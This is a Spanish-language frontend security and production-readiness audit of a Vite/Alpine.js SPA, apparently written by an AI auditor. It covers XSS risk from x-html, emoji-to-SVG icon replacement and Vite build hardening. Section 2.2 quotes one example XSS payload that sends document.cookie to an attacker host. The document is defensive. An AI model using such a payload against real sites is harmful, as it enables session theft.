# ROADMAP_PRODUCCION.md
## Diagnóstico Integral "Production-Ready" — COFAR SGD v2.0

**Fecha de Auditoría:** 2026-05-06  
**Auditor:** Arquitecto Frontend Principal (KIMI)  
**Alcance:** Cero refactorización de código existente. Este documento es únicamente un plan de ejecución técnico para los Lotes 14, 15 y 16.

---

## 📊 RESUMEN EJECUTIVO

La migración del monolito HTML a la SPA (Vite + Alpine.js + Tailwind CSS) ha sido técnicamente sólida. La arquitectura es limpia, las dependencias están controladas y el enrutamiento con lazy loading funciona correctamente. Sin embargo, **existen tres brechas críticas** que deben cerrarse antes de declarar la aplicación como "Production-Ready":

1. **Riesgo de Seguridad XSS:** 4 instancias de `x-html` renderizan HTML dinámico sin sanitización.
2. **Deuda Visual (Emojis):** ~312+ usos de emojis Unicode esparcidos en toasts, botones, tabs y modales, degradando la percepción profesional del sistema.
3. **Build sin Optimizar:** `vite.config.js` carece de chunk splitting, CSP y configuración de assets para producción.

---

## 1. SISTEMA DE ÍCONOS Y ASSETS (UI/UX)

### 1.1 Estado Actual

- **✅ Sistema SVG profesional ya existe:** `AppLayout.js` implementa un helper `ic()` que genera SVGs inline limpios para toda la navegación principal (Sidebar, Topbar). Esto es un excelente patrón.
- **❌ Emojis Unicode masivos:** Se detectaron **312+ coincidencias** de emojis esparcidos por `src/pages/` y `src/components/`.

### 1.2 Mapa de Emojis por Categoría

| Emoji | Ubicación Típica | Frecuencia Estimada |
|-------|------------------|---------------------|
| `✅` | Toasts de éxito, botones de confirmación, tabs | Alta |
| `⚠️` | Toasts de advertencia, mensajes de validación | Alta |
| `🗑` | Botones de eliminación en tablas (Parametrización, etc.) | Media |
| `💾` | Botones de guardar formularios | Media |
| `✕ / ✓` | Acciones inline en tablas de datos | Alta |
| `✏️` | Botones de editar filas | Media |
| `➡️` | Botones de mover áreas entre gerencias | Baja |
| `⏱ 🔒 📋 🏢 📧 👥 📜 📄 🚦` | Labels de tabs en Parametrización | Fija (7 tabs) |
| `⬇️` | Descargas y exportaciones | Media |
| `🔄` | Botones de sincronizar / limpiar filtros | Media |
| `✨` | Avatar del Asistente IA (Chat.js) | Fija |
| `✍️` | Icono del modal de Firma Digital | Fija |
| `↩` | Devolver al solicitante | Baja |
| `▶ →` | Flechas de navegación / acción | Baja |

### 1.3 Estrategia Técnica Recomendada

**Opción A (Recomendada): SVG Local + Helper Global**

> No usar CDN de Lucide. En entornos corporativos farmacéuticos (GMP), la aplicación debe funcionar 100% offline/intranet sin dependencias externas.

1. Crear carpeta `src/assets/icons/`.
2. Exportar los ~25 íconos necesarios desde [lucide.dev](https://lucide.dev) como archivos `.svg` individuales (o como un único `sprite.svg` con `<symbol>`).
3. Extender el helper existente `ic()` en `AppLayout.js` a un módulo global `src/utils/icons.js`:
   ```js
   // src/utils/icons.js
   export const Icon = (name, opts = {}) => {
     const { size = 16, class: cls = '' } = opts;
     const svg = ICONS_SVG[name]; // objeto con paths
     return `<svg width="${size}" height="${size}" ...>${svg}</svg>`;
   };
   ```
4. Crear un componente Alpine reutilizable para uso declarativo en templates:
   ```html
   <span x-data="{ icon(name) { return window.Icons[name] } }" x-html="icon('check')"></span>
   ```
   O más simple: reemplazar directamente los emojis por llamadas al helper `ic()` siguiendo el patrón ya establecido en `AppLayout.js`.

5. **Mapeo de reemplazo sugerido (ejemplos):**
   - `✅` → `ic('<polyline points="20 6 9 17 4 12"/>')` (Check de Lucide)
   - `⚠️` → Reutilizar el SVG `warn` ya existente en `AppLayout.js`
   - `🗑` → `ic('<polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>')`
   - `💾` → `ic('<path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/>')`
   - `✕` → `ic('<line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>')`

### 1.4 Assets Residuales

- `src/assets/vite.svg` y `src/assets/javascript.svg` son residuos del scaffold inicial de `create-vite`. No se referencian en ningún módulo de producción. **Acción:** Eliminar.
- `src/assets/hero.png` — verificar si se usa en `Login.js`. Si no, eliminar.

---

## 2. SEGURIDAD FRONTEND (Auditoría XSS Crítica)

### 2.1 Hallazgos

Se identificaron **4 usos de `x-html`** en la base de código. Cada uno representa un vector potencial de Cross-Site Scripting (XSS) si el contenido dinámico llega a contener etiquetas `<script>` o manejadores de eventos maliciosos.

| # | Archivo | Línea | Contexto | Nivel de Riesgo |
|---|---------|-------|----------|-----------------|
| 1 | `src/pages/Chat.js` | **79** | `x-html="m.txt"` — Renderiza las respuestas del Asistente IA. El texto proviene de `obtenerRespuestaIA()` en `src/data/iaRespuestas.js`. Actualmente es HTML hardcodeado interno, pero si en el futuro se conecta a un backend real (LLM/SQL), la respuesta podría ser manipulada. | **🔴 CRÍTICO** |
| 2 | `src/pages/Parametrizacion.js` | **816** | `x-html="previewHtml"` — Renderiza la vista previa de plantillas de notificación por email. El contenido se genera por regex replace sobre texto ingresado por el usuario administrador. | **🟠 ALTO** |
| 3 | `src/components/AuthModal.js` | **93** | `x-html="mensaje"` — Mensaje dinámico del modal de firma digital. Aunque actualmente se pasa desde código interno, es un vector si se abre a mensajes del servidor. | **🟡 MEDIO** |
| 4 | `src/components/ConfirmDeleteModal.js` | **45** | `x-html="mensaje"` — Mensaje de confirmación de eliminación. Algunos mensajes incluyen `<strong>` hardcodeado desde el llamador (ej. Parametrización). | **🟡 MEDIO** |

### 2.2 Análisis de Riesgo

**¿Por qué `x-html` es peligroso?**

Alpine.js no sanitiza el contenido inyectado mediante `x-html`. Si el valor de la expresión contiene:
```html
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
```
...el navegador ejecutará el JavaScript malicioso en el contexto de la sesión del usuario, permitiendo robo de cookies, tokens de localStorage o ejecución de acciones en nombre del usuario.

**Escenarios de ataque específicos:**
- **Chat.js:** Un atacante que comprometa el endpoint de la IA podría inyectar payloads que se rendericen en todos los usuarios del chat.
- **Parametrizacion.js:** Un administrador con rol ETO (usuarios internos) podría, intencional o accidentalmente, guardar una plantilla de email con scripts que luego se renderizan en la vista previa.

### 2.3 Estrategia de Mitigación

**Acción inmediata para cada instancia:**

1. **Chat.js (m.txt):**
   - Si el formato HTML es estrictamente necesario (negritas, saltos de línea), **instalar DOMPurify** y sanitizar antes de asignar a `m.txt`.
   - Alternativa (si no se necesita HTML): migrar a `x-text`. Los `<br>` se pueden reemplazar por saltos de línea reales y estilizar con `white-space: pre-line`.

2. **Parametrizacion.js (previewHtml):**
   - Sanitizar `previewHtml` con DOMPurify antes de asignarlo.
   - Considerar migrar la generación del preview a un Web Worker o una función pura de utilidad.

3. **AuthModal.js y ConfirmDeleteModal.js (mensaje):**
   - Evaluar si realmente se necesita HTML. Si solo se usa `<strong>`, se puede eliminar el tag y usar `x-text` con clases de Tailwind (`font-semibold`) en el contenedor.
   - Si se mantiene HTML, sanitizar con DOMPurify en el setter del componente.

**Instalación propuesta:**
```bash
npm install dompurify
```
Crear wrapper en `src/utils/sanitize.js`:
```js
import DOMPurify from 'dompurify';
export const safeHtml = (dirty) => DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br', 'p', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: []
});
```

**Medida complementaria — Content Security Policy (CSP):**
Agregar en `index.html` (dentro de `<head>`) un meta tag restrictivo:
```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self' https://fonts.gstatic.com; connect-src 'self';">
```
> Nota: `'unsafe-inline'` en `style-src` es necesario por Tailwind CSS en desarrollo. En producción con build, Tailwind purga todo a CSS estático, por lo que eventualmente se podría eliminar.

---

## 3. ARQUITECTURA, VITE Y DEPENDENCIAS

### 3.1 Análisis de `package.json`

```json
{
  "name": "cofar-sgd",
  "version": "0.0.0",          // ⚠️ Debe actualizarse a semver (ej. 1.0.0)
  "private": true,
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview"
  },
  "devDependencies": {
    "@tailwindcss/forms": "^0.5.11",
    "@tailwindcss/typography": "^0.5.19",
    "autoprefixer": "^10.5.0",
    "playwright": "^1.59.1",     // ⚠️ Verificar si se usa para tests E2E
    "postcss": "^8.5.12",
    "tailwindcss": "^3.4.19",
    "vite": "^8.0.10"
  },
  "dependencies": {
    "alpinejs": "^3.15.11"
  }
}
```

**Veredicto:** El árbol de dependencias es **excepcionalmente limpio**. No se detectan librerías innecesarias ("bloat"). Solo se señala:
- **Playwright:** Si no existe un directorio `tests/` o `e2e/`, es candidato a eliminación para reducir `node_modules` y tiempos de CI/CD.
- **Versión `0.0.0`:** Debe reflejar la versión real del producto.

### 3.2 Análisis de `vite.config.js` (Estado Actual)

```js
import { defineConfig } from 'vite'

export default defineConfig({
  server: { port: 3000, open: true, host: true },
  css: { devSourcemap: true },
  build: {
    outDir: 'dist',
    sourcemap: true,
    rollupOptions: {
      input: './index.html',
    },
  },
})
```

**Problemas identificados:**
1. **No hay chunk splitting:** Todo el código se empaqueta en unos pocos bundles. Las librerías (Alpine.js), el layout y las páginas pesadas comparten el mismo chunk.
2. **No hay `base` configurado:** Si el deploy ocurre en un subdirectorio (ej. `https://intranet.cofar.com/sgd/`), los assets fallarán.
3. **Sourcemaps activos en build:** Aumentan el tamaño del deploy. En producción se recomiendan `hidden` o desactivados.
4. **No hay target de navegador explícito:** Vite usa `modules` por defecto. Para intranets con navegadores corporativos antiguos, conviene especificar `target: 'es2020'`.

### 3.3 Configuración `build.rollupOptions` Propuesta

```js
import { defineConfig } from 'vite'

export default defineConfig(({ mode }) => ({
  base: './', // o process.env.BASE_URL en CI/CD
  server: {
    port: 3000,
    open: true,
    host: true,
  },
  css: {
    devSourcemap: mode === 'development',
  },
  build: {
    outDir: 'dist',
    sourcemap: mode === 'development' ? true : 'hidden',
    target: 'es2020',
    assetsDir: 'assets',
    chunkSizeWarningLimit: 500,
    rollupOptions: {
      input: './index.html',
      output: {
        manualChunks: {
          // Librería core — rara vez cambia, máximo cacheo
          'vendor': ['alpinejs'],
          // Layout y componentes globales que se cargan en cada ruta autenticada
          'layout': [
            './src/layouts/AppLayout.js',
            './src/components/ModalBase.js',
            './src/components/Toast.js',
            './src/components/LoadingOverlay.js',
          ],
          // Todos los modales globales (pesan pero no siempre se usan todos)
          'modals': [
            './src/components/AuthModal.js',
            './src/components/ProfileModal.js',
            './src/components/ConfirmDeleteModal.js',
            './src/components/EditUserModal.js',
            './src/components/MoveAreaModal.js',
            './src/components/AlcanceModal.js',
            './src/components/DelegarTareaModal.js',
            './src/components/ExamConfirmModal.js',
            './src/components/RespuestasExamenModal.js',
            './src/components/ConfirmCancelModal.js',
            './src/components/ConfirmLiberacionModal.js',
            './src/components/AuthRecepcionModal.js',
            './src/components/AuthDevolucionModal.js',
            './src/components/ObsolescenciaModal.js',
            './src/components/TimelineModal.js',
            './src/components/PdfViewerModal.js',
            './src/components/ParametrosDifusionModal.js',
          ],
          // Stores globales
          'stores': [
            './src/store/auth.js',
            './src/store/app.js',
            './src/store/flow.js',
            './src/store/notificaciones.js',
          ],
        },
        // Naming consistente para cache busting y debugging
        entryFileNames: 'js/[name]-[hash].js',
        chunkFileNames: 'js/[name]-[hash].js',
        assetFileNames: (assetInfo) => {
          const info = assetInfo.name.split('.');
          const ext = info[info.length - 1];
          if (/\.(png|jpe?g|gif|svg|webp|ico)$/.test(assetInfo.name)) {
            return 'img/[name]-[hash][extname]';
          }
          if (/\.(css)$/.test(assetInfo.name)) {
            return 'css/[name]-[hash][extname]';
          }
          return 'assets/[name]-[hash][extname]';
        },
      },
    },
  },
  esbuild: {
    drop: mode === 'production' ? ['console', 'debugger'] : [],
  },
}))
```

**Beneficios esperados:**
- Alpine.js se cachea indefinidamente en el navegador del usuario (el hash solo cambia al actualizar la librería).
- El bundle de layout carga una sola vez; las páginas siguen siendo lazy-loaded por el router.
- Sourcemaps ocultos en producción (útil para Sentry/debug sin exponer estructura).
- `esbuild.drop` elimina automáticamente TODO `console.log` y `debugger` del build final.

---

## 4. CODE SMELLS Y LIMPIEZA

### 4.1 `console.log` y Logs en Producción

| Archivo | Línea | Tipo | Estado |
|---------|-------|------|--------|
| `src/router/index.js` | 146 | `console.error("Error cargando la página:", error);` | ⚠️ Único `console.*` en toda la base. Aceptable durante desarrollo, pero debe eliminarse o reemplazarse por un toast de error en producción. |

**Veredicto:** Excelente disciplina de código. No hay `console.log` de debug olvidados. La propuesta de `esbuild.drop` en el Lote 16 eliminará automáticamente cualquier residual en el build.

### 4.2 Funciones Comentadas Masivamente / Código Muerto

- No se detectaron bloques de código comentados masivamente (>200 caracteres consecutivos comentados).
- `src/main.js` tiene 2 líneas comentadas (`// document.body.insertAdjacentHTML...`) que son placeholders intencionales para modales standalone. Están documentadas y no constituyen smell grave.

### 4.3 Variables Declaradas sin Usar

- El análisis de flujo estático no detectó variables `let`/`const` declaradas y nunca referenciadas en los archivos principales.
- El helper `ic()` en `AppLayout.js` está perfectamente utilizado.

### 4.4 Otros Smells Detectados

| # | Smell | Ubicación | Severidad | Recomendación |
|---|-------|-----------|-----------|---------------|
| 1 | **Carga de fuentes externas** | `index.html` carga Inter desde Google Fonts | Media | Para entornos intranet offline, considerar self-hosting de la fuente en `public/fonts/`. |
| 2 | **Falta de `<noscript>`** | `index.html` no tiene fallback para JS deshabilitado | Baja | Agregar `<noscript><p>JavaScript es requerido para usar el SGD.</p></noscript>`. |
| 3 | **Meta tags de seguridad faltantes** | `index.html` carece de `X-Content-Type-Options`, `Referrer-Policy`, etc. | Media | Agregar meta tags de hardening (ver Lote 14). |
| 4 | **Versión del paquete** | `"version": "0.0.0"` | Baja | Actualizar a `1.0.0-rc.1` o similar. |
| 5 | **Comentarios con caracteres especiales** | Bloques con `═` y acentos en español | Baja | Son inofensivos en UTF-8, pero verificar que el servidor sirva `charset=utf-8`. Ya está en `<meta charset="UTF-8">`. |

---

## 🎯 PLAN DE EJECUCIÓN POR LOTES

> **Regla de escritura:** En los lotes 14, 15 y 16 se autoriza la modificación de archivos según lo especificado en cada lote. No se debe modificar código fuera del alcance definido para cada sesión.

---

### 🔒 LOTE 14 — SEGURIDAD CRÍTICA Y SANITIZACIÓN
**Objetivo:** Eliminar vectores XSS, hardenear `index.html` y sanear el build.

1. **Instalar DOMPurify:**
   ```bash
   npm install dompurify
   ```
2. **Crear `src/utils/sanitize.js`:** Wrapper con política restrictiva de tags permitidos (`<b>`, `<strong>`, `<i>`, `<em>`, `<br>`, `<p>`, `<ul>`, `<ol>`, `<li>`).
3. **Auditar y migrar los 4 `x-html`:**
   - `src/pages/Chat.js:79` → Usar `x-html="safeTxt(m.txt)"` donde `safeTxt` sanitiza vía DOMPurify. Alternativamente, si el formato es simple, migrar a `x-text` + `white-space: pre-line`.
   - `src/pages/Parametrizacion.js:816` → Sanitizar `previewHtml` con DOMPurify antes de asignar en `previsualizarPlantilla()`.
   - `src/components/AuthModal.js:93` → Migrar a `x-text` si no requiere formato HTML. Si requiere negritas, aplicar clase al contenedor y usar `x-text`.
   - `src/components/ConfirmDeleteModal.js:45` → Idem. Los `<strong>` del mensaje se reemplazan por `x-text` + clase `font-semibold` en el `<p>` contenedor.
4. **Hardening de `index.html`:**
   - Agregar `<meta http-equiv="Content-Security-Policy" ...>`.
   - Agregar `<meta name="referrer" content="strict-origin-when-cross-origin">`.
   - Agregar `<noscript>` fallback.
5. **Crear `src/utils/logger.js`:** Wrapper que en `production` silencie `console.error` o lo envíe a un servicio de logging, y en `development` lo deje pasar.
6. **Reemplazar `console.error` del router** por `logger.error()` + toast visual al usuario.

**Entregable esperado:** Build pasa sin `x-html` sin sanitizar. Validar que el Chat, la preview de plantillas y los modales de confirmación sigan funcionando visualmente igual.

---

### 🎨 LOTE 15 — SISTEMA PROFESIONAL DE ÍCONOS Y LIMPIEZA VISUAL
**Objetivo:** Reemplazar 100% de emojis Unicode por SVGs profesionales, eliminar assets residuales y pulir la percepción visual del sistema.

1. **Crear `src/utils/icons.js`:**
   - Extraer el helper `ic()` de `AppLayout.js` a este módulo reutilizable.
   - Exportar un catálogo de ~30 íconos Lucide (check, x, trash-2, save, edit-3, arrow-right, clock, lock, clipboard, building, mail, users, scroll-text, file-text, traffic-light, download, paperclip, refresh-cw, undo-2, sparkle, pen-tool, alert-triangle, chevron-down, search, menu, bell, etc.).
2. **Actualizar `AppLayout.js`:**
   - Importar íconos desde `src/utils/icons.js`.
   - Eliminar la definición local de `ic()` e `ICONS` (o reexportar desde el módulo central).
3. **Reemplazo masivo de emojis (prioridad por impacto visual):**
   - **Toasts:** Revisar `src/components/Toast.js` para aceptar un ícono SVG como parámetro alternativo al string de emoji. Actualizar TODAS las llamadas `window.toast('✅ ...')` → `window.toast('...', 'success', { icon: 'check' })`.
   - **Tabs de Parametrización:** Reemplazar emojis en los 7 labels de tabs por SVGs inline de 16px.
   - **Botones de acción en tablas:** Reemplazar `✓`, `✕`, `✏️`, `🗑`, `💾`, `➡️` en Parametrización, Lista Maestra y demás páginas.
   - **Chat.js:** Reemplazar el avatar `✨` por un SVG de "sparkles" o una imagen de avatar de IA.
   - **AuthModal.js:** Reemplazar `✍️` por un SVG de "pen-tool".
   - **ConfirmDeleteModal.js:** Reemplazar `⚠️` por el SVG `warn` ya existente.
4. **Eliminar assets residuales:** Borrar `src/assets/vite.svg` y `src/assets/javascript.svg`. Verificar y borrar `hero.png` si no se usa.
5. **Actualizar `package.json`:** Cambiar `"version": "0.0.0"` a `"1.0.0"` (o la versión de release correspondiente).

**Entregable esperado:** Ningún archivo `.js` contiene emojis Unicode. La interfaz visual es idéntica o superior, con íconos nítidos en todos los tamaños de pantalla.

---

### ⚡ LOTE 16 — OPTIMIZACIÓN DE BUILD VITE Y CODE QUALITY
**Objetivo:** Implementar chunk splitting, configurar build de producción, limpieza final y preparar el deploy.

1. **Refactorizar `vite.config.js`:**
   - Implementar la configuración completa propuesta en la sección 3.3 (manual chunks, naming, sourcemap hidden, target es2020, esbuild.drop).
   - Agregar `base: './'` (ajustar según el entorno de deploy final).
2. **Variables de entorno:**
   - Crear `.env.development` y `.env.production`.
   - Mover `VITE_API_BASE_URL`, flags de debug, etc., a variables de entorno.
   - Actualizar el código que necesite estas variables para usar `import.meta.env.VITE_*`.
3. **Limpiar `devDependencies`:**
   - Evaluar si `playwright` se utiliza. Si no hay tests E2E, ejecutar `npm uninstall playwright`.
4. **Validar build de producción:**
   ```bash
   npm run build
   ```
   - Verificar que no haya errores de Rollup.
   - Verificar que los chunks se generen correctamente en `dist/js/`.
   - Verificar que el tamaño del vendor chunk sea razonable (~15-25KB gzipped para Alpine.js).
5. **Prueba de funcionamiento end-to-end:**
   - `npm run preview`
   - Navegar por todas las rutas principales (Login, Bandeja, Lista Maestra, Parametrización, Chat, Evaluaciones).
   - Verificar que los modales globales abran correctamente.
   - Verificar que los toasts muestren los nuevos íconos SVG.
6. **Documentación final:**
   - Actualizar `README.md` (si existe) con instrucciones de build y deploy.
   - Crear `DEPLOY.md` con pasos para publicar en el servidor IIS/Apache/Nginx de COFAR.

**Entregable esperado:** `npm run build` genera un `dist/` optimizado, listo para copiar a un servidor web estático. El sistema es visualmente pulido, seguro contra XSS básico y con cacheo eficiente de assets.

---

## 📎 ANEXOS

### Anexo A: Archivos Auditados (muestra representativa)

| Archivo | Líneas | Área Auditada |
|---------|--------|---------------|
| `src/layouts/AppLayout.js` | 445 | Íconos SVG, estructura layout |
| `src/router/index.js` | 156 | Routing, lazy loading, console.error |
| `src/main.js` | 119 | Bootstrap, dependencias, init order |
| `src/store/auth.js` | 171 | Autenticación, persistencia localStorage |
| `src/pages/Parametrizacion.js` | >982 | Emojis masivos, `x-html` en preview |
| `src/pages/Chat.js` | 140 | `x-html` en mensajes de IA, emojis |
| `src/components/AuthModal.js` | 160 | `x-html` en mensaje, emoji ✍️ |
| `src/components/ConfirmDeleteModal.js` | 58 | `x-html` en mensaje, emoji ⚠️ |
| `src/pages/ListaMaestra.js` | 358 | Emojis en toasts y botones |
| `index.html` | 36 | Meta tags, fuentes externas |
| `package.json` | 23 | Dependencias, scripts |
| `vite.config.js` | 19 | Build config (incompleta) |
| `tailwind.config.js` | 56 | Tema, animaciones, safelist |

### Anexo B: Estadísticas de la Auditoría

- **Total de archivos JS/HTML auditados:** 60+
- **Usos de `x-html` encontrados:** 4
- **Usos de emojis Unicode encontrados:** 312+
- **`console.log` olvidados:** 0 (1 `console.error` justificado pero a reemplazar)
- **Funciones comentadas masivamente:** 0
- **Variables sin usar detectadas:** 0
- **Librerías innecesarias:** 1 candidato (`playwright` — pendiente de verificación)
- **Assets residuales del scaffold:** 2 (`vite.svg`, `javascript.svg`)

---

*Fin del Diagnóstico Integral. Proceder con los Lotes 14 → 15 → 16 en sesiones consecutivas.*
